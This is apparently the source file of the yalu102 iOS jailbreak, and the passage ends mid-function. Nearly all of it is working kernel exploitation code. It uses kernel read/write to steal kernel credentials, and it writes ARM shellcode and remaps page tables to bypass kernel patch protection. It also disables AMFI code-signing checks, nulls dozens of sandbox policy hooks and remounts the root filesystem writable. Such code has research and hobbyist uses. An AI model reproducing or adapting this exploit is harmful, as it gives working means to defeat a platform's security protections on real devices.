//
//  jailbreak.m
//  yalu102
//
//  Created by qwertyoruiop on 07/01/2017.
//  Copyright © 2017 kimjongcracks. All rights reserved.
//

#import <Foundation/Foundation.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#import "devicesupport.h"

#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <pthread.h>
#import <mach/mach.h>

#import "devicesupport.h"
#import <sys/mount.h>
#import <spawn.h>
#import <copyfile.h>
#import <mach-o/dyld.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <sys/utsname.h>

#import "patchfinder64.h"

#define vm_address_t mach_vm_address_t

mach_port_t tfp0=0;
uint64_t slide=0;
io_connect_t funcconn=0;
// #define NSLog(...)
kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

uint32_t FuncAnywhere32(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2)
{
    return IOConnectTrap4(funcconn, 0, x1, x2, x0, addr);
}

void copyin(void* to, uint64_t from, size_t size) {
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000) {
        size = 0x1000;
    }
    size_t off = 0;
    while (1) {
        mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0) {
            break;
        }
        size = szt;
        if (size > 0x1000) {
            size = 0x1000;
        }
        
    }
}

void copyout(uint64_t to, void* from, size_t size) {
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint64_t ReadAnywhere64(uint64_t addr) {
    uint64_t val = 0;
    copyin(&val, addr, 8);
    return val;
}

uint64_t WriteAnywhere64(uint64_t addr, uint64_t val) {
    copyout(addr, &val, 8);
    return val;
}

uint32_t ReadAnywhere32(uint64_t addr) {
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
    copyout(addr, &val, 4);
    return val;
}

#import "pte_stuff.h"

void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
{
    io_iterator_t iterator;
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"), &iterator);
    io_object_t servicex = IOIteratorNext(iterator);
    funcconn = 0;
    IOServiceOpen(servicex, mach_task_self(), 0, &funcconn);
    assert(funcconn);
    
    tfp0 = pt;
    
    uint64_t bsd_task=0;
    uint64_t launchd_task = 0;
    {
        uint64_t proc = ReadAnywhere64(allprocs+kernbase);
        NSLog(@"found procs at %llx", proc);
        while (proc) {
            uint32_t pid = ReadAnywhere32(proc+0x10);
            if (pid == getpid()) {
                bsd_task = proc;
            } else
                if (pid == 1) {
                    launchd_task = proc;
                }
            
            if (launchd_task && bsd_task) break;
            
            proc = ReadAnywhere64(proc);
        }
    }
    uint64_t cred = ReadAnywhere64(bsd_task+0x100);
    
    uint64_t credpatch = 0;
    uint64_t proc = bsd_task;
    while (proc) {
        uint32_t pid = ReadAnywhere32(proc+0x10);
        uint32_t csflags = ReadAnywhere32(proc+0x2a8);
        csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
        csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
        WriteAnywhere32(proc+0x2a8, csflags);
        if (pid == 0) {
            credpatch = ReadAnywhere64(proc+0x100);
            break;
        }
        proc = ReadAnywhere64(proc);
    }
    
    uint64_t orig_cred = cred;
    
    WriteAnywhere64(bsd_task+0x100, credpatch);
    
    checkvad();
    
    vm_address_t vmd = 0;
    _kernelrpc_mach_vm_allocate_trap(mach_task_self(), &vmd, 0x4000, VM_FLAGS_ANYWHERE);
    
    copyin((void*)vmd, kernbase, 0x4000);
    
    struct mach_header_64* vmk = vmd;
    uint64_t max = 0;
    uint64_t min = -1;
    
    struct load_command* lc = vmk+1;
    for (int k=0; k < vmk->ncmds; k++) {
        
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64* sg = lc;
            NSLog(@"seg: %s", sg->segname);
            if (sg->vmaddr < min) {
                min = sg->vmaddr;
            }
            if (sg->vmaddr + sg->vmsize > max) {
                max = sg->vmaddr+sg->vmsize;
            }
        }
        
        lc = ((char*)lc) + lc->cmdsize;
    }
    
    NSLog(@"%llx - %llx", min, max);
    
    char* kdump = malloc(max-min);
    
    for (int k=0; k < (max-min)/0x4000; k++) {
        copyin(kdump+k*0x4000, min+k*0x4000, 0x4000);
    }
    
    NSLog(@"%llx", kdump);
    uint64_t kerndumpsize = 0;
    uint64_t gadget_base = 0;
    uint64_t gadget_size = 0;
    uint64_t prelink_base = 0;
    uint64_t prelink_size = 0;
    uint64_t kerndumpbase = -1;
    
    
    struct mach_header_64* mh_kern = (struct mach_header_64*) (kdump+kernbase-min);
    struct load_command* load_cmd = (struct load_command*)(mh_kern+1);
    
    uint64_t entryp = 0;
    
    for (int i = 0; i < mh_kern->ncmds; i++) {
        
        if (load_cmd->cmd == LC_SEGMENT_64) {
            struct segment_command_64* seg = (struct segment_command_64*)load_cmd;
            //NSLog(@"found segment %s", seg->segname);
            
            if (strcmp(seg->segname, "__TEXT_EXEC") == 0) {
                gadget_base = seg->vmaddr;
                gadget_size = seg->filesize;
            }
            if (strcmp(seg->segname, "__PLK_TEXT_EXEC") == 0) {
                prelink_base = seg->vmaddr;
                prelink_size = seg->filesize;
            }
            
            if (seg->vmaddr < kerndumpbase) {
                kerndumpbase = seg->vmaddr;
            }
            kerndumpsize += seg->vmsize;
        } else if (load_cmd->cmd == LC_UNIXTHREAD) {
            struct {
                unsigned long	cmd;		/* LC_THREAD or  LC_UNIXTHREAD */
                unsigned long	cmdsize;	/* total size of this command */
                unsigned long flavor;       /* flavor of thread state */
                unsigned long count;		   /* count of longs in thread state */
                struct {
                    __uint64_t    __x[29];  /* General purpose registers x0-x28 */
                    __uint64_t    __fp;     /* Frame pointer x29 */
                    __uint64_t    __lr;     /* Link register x30 */
                    __uint64_t    __sp;     /* Stack pointer x31 */
                    __uint64_t    __pc;     /* Program counter */
                    __uint32_t    __cpsr;   /* Current program status register */
                    __uint32_t    __pad;    /* Same size for 32-bit or 64-bit clients */
                } state;
            } * thr = load_cmd;
            entryp = thr->state.__pc;
        }
        
        load_cmd = (struct load_command*)(load_cmd->cmdsize + (vm_address_t)(load_cmd));
    }
    set_dump(kerndumpbase, kerndumpsize, (uint8_t*)kdump);
    set_text_exec(gadget_base, gadget_size);
    set_prelink_exec(prelink_base, prelink_size);
    
    uint64_t gStoreBase = find_gPhysBase();
    
    gPhysBase = ReadAnywhere64(gStoreBase);
    gVirtBase = ReadAnywhere64(gStoreBase+8);
    
    entryp += slide;
    uint64_t rvbar = entryp & (~0xFFF);
    
    uint64_t cpul = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), rvbar-gadget_base+0x40, text_exec_base, 1);
    
    uint64_t optr = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), rvbar-gadget_base+0x50, text_exec_base, 20);
    if (uref) {
        optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
    }
    NSLog(@"%llx", optr);
    
    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    uint64_t cpu = ReadAnywhere64(cpu_list);
    
    uint64_t pmap_store = find_kernel_pmap();
    NSLog(@"pmap: %llx", pmap_store);
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
    
    
    
    
    uint64_t shellcode = physalloc(0x4000);
    
    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */
    
    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
    
    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
    
    char buf[0x100];
    copyin(buf, optr, 0x100);
    copyout(shellcode+0x300, buf, 0x100);
    
    uint64_t physcode = findphys_real(shellcode);
    
    
    
    NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);
    
    uint64_t idlesleep_handler = 0;
    
    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;
    
    int idx = 0;
    int ridx = 0;
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            NSLog(@"already jailbroken, bailing out");
            return;
        }
        
        
        if (!idlesleep_handler) {
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
            
            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
            
            
            uint32_t* opcz = malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }
            
            
        }
        
        NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
        NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
        
        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }
    
    
    uint64_t shc = physalloc(0x4000);
    
    uint64_t regi = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), idlesleep_handler+12-gadget_base, text_exec_base, 30);
    uint64_t regd = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), idlesleep_handler+24-gadget_base, text_exec_base, 30);
    
    NSLog(@"%llx - %llx", regi, regd);
    
    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f);
    }
    
    /*
     isvad 0 == 0x4000
     */
    
    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
    
    uint64_t ttbr0_real = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), idlesleep_handler + idx*4 - gadget_base + 24, text_exec_base, 1);
    
    NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
    
    char* bbuf = malloc(0x4000);
    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
    
    uint64_t physp = findphys_real(level0_pte);
    
    
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regi);
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    
    shc+=0x100;
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    shc-=0x100;
    {
        int n = 0;
        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr	w8, 0x28
        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str		w8, [x23]
        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov	 x0, xzr
        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub	sp, x29, #64
        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp	x29, x30, [sp, #64]
        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp	x20, x19, [sp, #48]
        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp	x22, x21, [sp, #32]
        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp	x24, x23, [sp, #16]
        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp	x26, x25, [sp], #80
        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
        
    }
    
    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    vm_address_t kppsh = 0;
    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
    {
        int n = 0;
        
        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr	x1, #60
        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr	x0, #40
        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr	TTBR1_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz	x0, #0x30, lsl #16
        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr	CPACR_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi	vae1, x30 (16k)
        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
    }
    
    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
    
    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
    
    /*
     
     pagetables are now not real anymore, they're real af
     
     */
    
    int cpacr_idx = 0;
    uint32_t* opps = gadget_base - min + kdump;
    
    while (1) {
        if (opps[cpacr_idx] == 0xd5181040) {
            NSLog(@"got a cpacr");
            break;
        }
        cpacr_idx++;
    }
#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)
    
    
#define RemapPage_(address) \
pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
uint64_t tte = ReadAnywhere64(tte_addr);\
if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
NSLog(@"breakup!");\
uint64_t fakep = physalloc(PSZ);\
uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
TTE_SETB(tte, TTE_IS_TABLE_MASK);\
for (int i = 0; i < PSZ/8; i++) {\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
WriteAnywhere64(fakep+i*8, tte);\
}\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
WriteAnywhere64(tte_addr, tte);\
}\
uint64_t newt = physalloc(PSZ);\
copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
copyout(newt, bbuf, PSZ);\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
WriteAnywhere64(tte_addr, tte);\
}, level1_table, isvad ? 1 : 2);
    
#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
    
    uint64_t* remappage = calloc(512, 8);
    
    int remapcnt = 0;
    
    
#define RemapPage(x)\
{\
int fail = 0;\
for (int i = 0; i < remapcnt; i++) {\
if (remappage[i] == (x & (~PMK))) {\
fail = 1;\
}\
}\
if (fail == 0) {\
RemapPage_(x);\
RemapPage_(x+PSZ);\
remappage[remapcnt++] = (x & (~PMK));\
}\
}
    
    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
    
    
    uint64_t shtramp = kernbase + mh_kern->sizeofcmds + sizeof(struct mach_header_64);
    RemapPage(gadget_base + cpacr_idx*4);
    WriteAnywhere32(NewPointer(gadget_base + cpacr_idx*4), 0x94000000 | (((shtramp - (gadget_base+cpacr_idx*4))/4) & 0x3FFFFFF));
    
    RemapPage(shtramp);
    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
    
    uint64_t lwvm_write = find_lwvm_mapio_patch();
    uint64_t lwvm_value = find_lwvm_mapio_newj();
    RemapPage(lwvm_write);
    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
    
    
    uint64_t kernvers = (uint8_t*)memmem(whole_dump, (size_t)whole_size, "Darwin Kernel Version", strlen("Darwin Kernel Version")) - whole_dump;
    uint64_t release = (uint8_t*)memmem(whole_dump, (size_t)whole_size, "RELEASE_ARM", strlen("RELEASE_ARM")) - whole_dump;
    
    RemapPage(kernvers+whole_base-4);
    WriteAnywhere32(NewPointer(kernvers+whole_base-4), 1);
    
    RemapPage(release+whole_base);
    if (NewPointer(release+whole_base) == (NewPointer(release+whole_base+11) - 11)) {
        copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
    }
    
    
    /*
     tfp0 and patch this bug
     */
    {
        uint64_t endf = prelink_base+prelink_size;
        uint64_t ends = whole_size - (endf - whole_base);
        uint32_t* opps_stream = whole_dump + endf - whole_base;
        uint64_t* ptr_stream = whole_dump + endf - whole_base;

        uint64_t lastk = 0;
        int streak = 0;
        
        for (int i = 0; i < ends/8; i++) {
            uint64_t offp = ptr_stream[i];
            if (endf < offp && offp < endf+ends) {
                offp -= endf;
                offp /= 4;
                if (ptr_stream[i+1] == 0 && ptr_stream[i+2] == 0) {
                    if (opps_stream[offp] == 0x321e03e0 && opps_stream[offp+1] == 0xd65f03c0) {
                        if (lastk+streak*0x20 == i*8 - 0x20) {
                            streak++;
                            if (streak == 9) {
                                break;
                            }
                        } else {
                            streak=0;
                            lastk = i*8;
                        }
                    }
                }
            }
        }
        
        
        if (streak == 9) {

            
            char* sbstr = whole_dump + lastk + endf - whole_base - 8;
            
            uint64_t extract_attr_recipe = *(uint64_t*)(sbstr + 72 * 0x20 + 8 /*fptr*/);
            
            uint32_t* opcode_stream = extract_attr_recipe - whole_base + whole_dump;
            
            int l = 0;
            while (1) {
                if ((opcode_stream[l] & 0xFFFFFC00) == 0x7103FC00) { // find cmp wX, 0xFF
                    int cbz = l;
                    while (1) {
                        if ((opcode_stream[cbz] & 0xFF000000) == 0xB4000000) {
                            break;
                        }
                        cbz--;
                    }
                    
                    uint64_t ret_target = (opcode_stream[cbz] & 0xFFFFE0) >> 5;
                    ret_target += cbz;
                    
                    
                    int bhi = l;
                    while (1) {
                        if ((opcode_stream[bhi] & 0xFF000000) == 0x54000000) {
                            break;
                        }
                        bhi++;
                    }
                    
                    ret_target -= bhi;
                    
                    uint32_t new_opcode = opcode_stream[bhi] & (~0xFFFFE0);
                    new_opcode |= (ret_target << 5) & 0xFFFFE0;
                    
                    RemapPage(extract_attr_recipe + bhi*4);
                    WriteAnywhere32(NewPointer(extract_attr_recipe+bhi*4), new_opcode);
                    
                    break;
                }
                l++;
            }
            
            uint64_t tfp = *(uint64_t*)(sbstr + 45 * 0x20 + 8 /*fptr*/);
            
            opcode_stream = tfp - whole_base + whole_dump;
            
            int cbz = 0;
            while (1) {
                if ((opcode_stream[cbz] & 0xFF000000) == 0x34000000) {
                    break;
                }
                cbz++;
            }
            
            RemapPage(tfp + cbz*4);
            WriteAnywhere32(NewPointer(tfp+cbz*4), 0xd503201f);
        }
        
    }
    /*
     nonceenabler
     */
    
    {
        uint64_t endf = prelink_base+prelink_size;
        uint64_t ends = whole_size - (endf - whole_base);
        char* sbstr = memmem(whole_dump + endf - whole_base, ends, "com.apple.System.boot-nonce", strlen("com.apple.System.boot-nonce"));
        
        if (sbstr) {
            
            for (int i = 0; i < whole_size/8; i++) {
                if (*(uint64_t*)(whole_dump+i*8) == (sbstr - (uint64_t)whole_dump + whole_base)) {
                    NSLog(@"%x", ReadAnywhere32(whole_base+i*8+8+4));
                    
                    WriteAnywhere32(whole_base+i*8+8+4, 1);
                }
            }
        }
    }
    
    
    
    uint64_t memcmp_got = find_amfi_memcmpstub();
    uint64_t ret1 = find_ret_0();
    
    RemapPage(memcmp_got);
    WriteAnywhere64(NewPointer(memcmp_got), ret1);
    
    uint64_t fref = find_reference((uint32_t*)get_data_for_mode(0, SearchTextExec), text_exec_size, text_exec_base, idlesleep_handler+0xC) + text_exec_base;
    NSLog(@"fref at %llx", fref);
    
    uint64_t find_string_reference(char* string, enum Search mode);
    uint64_t amfiops = 0;
    //= find_string_reference("Apple Mobile File Integrity", SearchPrelinkExec);
    char* sbstr = memmem(whole_dump, whole_size, "Apple Mobile File Integrity", strlen("Apple Mobile File Integrity"));
    for (int i = 0; i < whole_size/8; i++) {
        if (*(uint64_t*)(whole_dump+i*8) == (sbstr - (uint64_t)whole_dump + whole_base)) {
            amfiops = *(uint64_t*)(whole_dump+i*8+0x18);
            break;
        }
    }
    
    NSLog(@"amfistr at %llx", amfiops);
    
    
    {
        /*
         amfi
         */
        
        uint64_t sbops = amfiops;
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
        
        uint64_t nopag = sbops_end - sbops;
        
        for (int i = 0; i < nopag; i+= PSZ) {
            RemapPage(((sbops + i) & (~PMK)));
        }
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
    }
    
    
    /*
     first str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x200);
            break;
        }
        fref += 4;
    }
    
    fref += 4;
    
    /*
     second str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value((uint32_t*)get_data_for_mode(0, SearchTextExec), fref-gadget_base, text_exec_base, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x100);
            break;
        }
        fref += 4;
    }
    
    {
        /*
         sandbox
         */
        
        uint64_t sbops = find_sbops();
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
        
        uint64_t nopag = (sbops_end - sbops)/(PSZ);
        
        for (int i = 0; i < nopag; i++) {
            RemapPage(((sbops + i*(PSZ)) & (~PMK)));
        }
        
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
        
    }
    
    {
        uint64_t point = find_amfiret()-0x18;
        
        RemapPage((point & (~PMK)));
        uint64_t remap = NewPointer(point);
        
        assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
        
        WriteAnywhere32(remap, 0x58000041);
        WriteAnywhere32(remap + 4, 0xd61f0020);
        WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
        
    }
    
    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }
    
    while (ReadAnywhere32(kernvers+whole_base-4) != 1) {
        sleep(1);
    }
    
    NSLog(@"enabled patches");
    
    {
        // mount patch
        extern uint64_t rootvnode_offset;
        uint64_t rootfs_vnode = ReadAnywhere64(rootvnode_offset + kernbase);
        
        struct utsname uts;
        uname(&uts);
        
        vm_offset_t off = 0xd8;
        if (strstr(uts.version, "16.0.0")) {
            off = 0xd0;
        }
        
        uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
        
        uint32_t v_flag = ReadAnywhere32(v_mount + 0x71);
        
        WriteAnywhere32(v_mount + 0x71, v_flag & (~(0x1<<6)));
        
